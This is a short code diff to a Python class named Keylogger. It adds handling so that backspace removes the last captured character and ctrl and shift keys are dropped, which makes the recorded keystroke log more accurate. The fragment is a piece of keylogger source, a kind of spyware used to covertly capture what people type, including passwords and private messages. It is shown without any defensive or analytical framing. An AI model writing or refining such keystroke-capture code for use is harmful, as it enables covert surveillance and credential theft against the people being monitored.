@@ -85,6 +85,13 @@ class Keylogger:
                 name = "\n"
             elif name == "decimal":
                 name = "."
+            elif name == "backspace":
+                name = ""
+                self.log = self.log[:-1]
+            elif name == "ctrl":
+                name = ""
+            elif name == "shift":
+                name = ""
             # else:
             #     name = name.replace(" ", "_")
             #     name = f"[{name.upper()}]"
